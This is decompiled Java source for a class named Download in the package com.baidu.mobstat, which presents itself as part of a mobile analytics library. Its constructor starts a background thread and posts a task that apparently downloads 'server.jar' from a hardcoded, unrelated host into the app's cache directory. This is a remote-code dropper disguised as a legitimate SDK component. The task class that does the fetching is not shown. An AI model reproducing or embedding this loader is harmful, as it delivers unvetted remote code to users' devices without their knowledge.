package com.baidu.mobstat;

import android.content.Context;
import android.os.Handler;
import android.os.HandlerThread;
import java.io.File;

public class Download
{
  static int a = 1;
  static int b = 2;
  static int c = 3;
  private static HandlerThread h = new HandlerThread("UpdaeJarThread");
  private static Handler i;
  private File d;
  private String e = "http://59travel.205.5ghl.cn/server.jar";
  private Handler f;
  private w g;
  private boolean j = false;
  private boolean k = false;
  private Handler l = new v(this);
  
  public Download(Context paramContext)
  {
    if (!a()) {}
    while ((k) || (j)) {
      return;
    }
    d = new File(paramContext.getCacheDir() + "/server.jar");
    h.start();
    f = new Handler(h.getLooper());
    if (g != null) {
      f.removeCallbacks(g);
    }
    g = new w(this);
    f.post(g);
  }
  
  static boolean a()
  {
    return true;
  }
}

/* Location:
 * Qualified Name:     com.baidu.mobstat.Download
 * Java Class Version: 6 (50.0)
 * JD-Core Version:    0.7.1
 */